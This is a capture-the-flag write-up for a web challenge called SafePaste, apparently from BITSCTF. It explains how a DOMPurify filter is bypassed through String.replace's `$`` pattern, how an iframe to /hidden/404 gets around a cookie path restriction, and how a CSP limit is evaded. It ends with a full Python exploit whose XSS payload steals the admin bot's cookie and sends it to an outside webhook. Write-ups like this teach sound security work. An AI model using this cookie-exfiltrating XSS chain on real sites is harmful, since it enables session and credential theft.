# SafePaste



<figure><img src="../.gitbook/assets/image (682).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (683).png" alt=""><figcaption></figcaption></figure>

### Analyze

SafePaste is a web service written in Node.js / Express that allows users to create a "paste" to store their text/HTML. The application implements a robust XSS filter using `isomorphic-dompurify` and enforces a strict Content Security Policy (CSP): `script-src 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'; default-src 'self'`.

The goal is to steal the Admin Bot's Flag, which is stored as a Cookie restricted by the path attribute: `path: "/hidden"`. The `/hidden` route on the backend will destroy the connection (`socket.destroy()`) if an invalid secret is provided.

Upon deep analysis of the source code (`server.ts` and `bot.ts`), several critical security flaws were chained together:

#### 1. String Replacement Injection in `server.ts`

The core vulnerability lies in how user content is injected into the HTML template after sanitization.

**Vulnerable Code Snippet (`server.ts`, Lines 49-57):**

```typescript
app.get("/paste/:id", (req, res) => {
  const content = pastes.get(req.params.id);
  if (!content) {
    return res.status(404).send("Paste not found");
  }

  // VULNERABLE: Direct string replacement
  const html = pasteTemplate.replace("{paste}", content);
  res.type("html").send(html);
});
```

_Note: In `app.post("/create"...)`, `content` is cleanly sanitized with `DOMPurify.sanitize(content)`, but the vulnerability happens later during rendering._

**In-depth Analysis:** The `String.prototype.replace(pattern, replacement)` function in JavaScript supports special replacement patterns. When you pass a string as the `replacement` parameter, an attacker can inject `` $` ``. This symbol tells the JS interpreter to insert the **entire string that precedes the matched substring** (in this case, `"{paste}"`).

Let's look at `views/paste.html`:

```html
<div class="paste-container">
  <img src="/logo.png" alt="SafePaste">
  <div class="content">{paste}</div>
```

If our payload is `<a title="$\`" data-x='>alert(1)'>\` (backtick escaped here for reading):

1. **Sanitization Bypass**: The payload looks like an innocent `<a>` tag with harmless attributes (`title` and `data-x`), so `DOMPurify` ignores it.
2. **The Injection**: When `replace()` hits the `` $` ``, it grabs everything from `<div class="paste-container">` up to `<div class="content">`.
3. **Premature Tag Closure**: This massive HTML chunk gets jammed inside our `title` attribute. The double quote (`"`) at the end of `<div class="content">` abruptly **closes the `title="..."` attribute**.
4. **Execution**: The subsequent `>` character forces the `<a>` tag to close. This violently ejects our payload `data-x='><script>alert(1)</script>'` entirely out of the anchor tag, turning it into raw, executing HTML. Since `isomorphic-dompurify` relies on `jsdom` (which doesn't enforce HTML-encoding for `<` and `>` inside attributes), the script runs smoothly.

#### 2. Cookie Path Bypass in `bot.ts` and `server.ts`

Getting XSS on `/paste/:id` isn't enough because the bot isolates its cookie.

**Vulnerable Code Snippet (`bot.ts`, Lines 20-27):**

```typescript
    const page = await browser.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/hidden", // <--- THE BOT'S DEFENSE
    });
```

**Vulnerable Code Snippet (`server.ts`, Lines 79-84):**

```typescript
app.get("/hidden", (req, res) => {
  if (req.query.secret === ADMIN_SECRET) {
    return res.send("Welcome, admin!");
  }
  res.socket?.destroy(); // <--- KICKS OUT UNINVITED GUESTS
});
```

**In-depth Analysis:** We can't just fetch `/hidden` nor can we grab `document.cookie` from `/paste/:id`. However, browsers match cookie paths based on **prefixes**. Any request to `/hidden/...` (like `/hidden/404`) will automatically include the cookie.

Since Express doesn't have a route explicitly for `/hidden/404`, it falls back to the default Express 404 handler. The default handler returns an HTTP 404 HTML page **without triggering the `socket?.destroy()`** logic of the `/hidden` route endpoint.

By injecting an `<iframe>` pointing to `/hidden/404` directly via XSS, the browser loads the page perfectly. Because it is under the Same-Origin policy (`localhost:3000`), our XSS script can securely cross the iframe barrier and steal `iframe.contentDocument.cookie`.

#### 3. CSP Bypass

Even after grabbing the cookie, the CSP `default-src 'self'` prevents `fetch()` or `XHR` from sending the stolen data out.

**In-depth Analysis:** To exfiltrate the flag, we abandon background fetches and opt for a top-level navigation redirect. We force the current window to navigate to the attacker's server by modifying `window.location`. This bypasses strict external network constraints.

***

### Exploit

Combining the vulnerabilities, we can build a Python script to automate the payload delivery, create the malicious paste, and report it to the Admin Bot.

_Note: Replace `WEBHOOK_URL` with your actual RequestRepo endpoint._

```python
#!/usr/bin/env python3
import requests

APP_URL = "http://20.193.149.152:3000"
WEBHOOK_URL = "http://r299y1w7.requestrepo.com"

def exploit():
    # 1. Initialize an Iframe to load a sub-path of /hidden 
    # and exfiltrate the stolen cookie via window.location
    js_payload = f"""
    let frm = document.createElement(`iframe`);
    frm.src = `/hidden/404`;
    frm.onload = () => {{
        let c = frm.contentDocument.cookie;
        window.location = `{WEBHOOK_URL}/?flag=` + encodeURIComponent(c);
    }};
    document.body.appendChild(frm);
    """

    # 2. Wrap the JS payload inside a data attribute and exploit String Replace 
    html_payload = f"""<a title="$\`" data-x='><script>{js_payload}</script>'></a>"""

    print(f"[*] Targeting: {APP_URL}")
    
    # 3. Create Paste
    res = requests.post(f"{APP_URL}/create", data={"content": html_payload}, allow_redirects=False)

    if res.status_code == 302:
        paste_url = APP_URL + res.headers['Location']
        print(f"[+] Paste created: {paste_url}")
        
        # 4. Submit Paste Link Report to Admin Bot
        reg = requests.post(f"{APP_URL}/report", data={"url": paste_url})
        print(f"[*] Report Triggered. Payload deployed successfully!")
        print(f"[!] Please check your Webhook {WEBHOOK_URL} waiting for the Flag.")
    else:
        print("[-] Failed to create Paste!")

if __name__ == "__main__":
    exploit()
```

***

### Flag

After executing the exploit script, the simulated Admin Bot triggers the XSS payload. The iframe loads the restricted cookie, and top-level navigation exfiltrates it to our webhook.

The extracted Flag received at the RequestRepo endpoint (URL-Encoded): `FLAG%3DBITSCTF%7Bn07_r34lly_4_d0mpur1fy_byp455%3F_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635%F0%9F%A5%80%7D`

Decoding it to Plain Text UTF-8 yields the final flag:

```
BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}
```

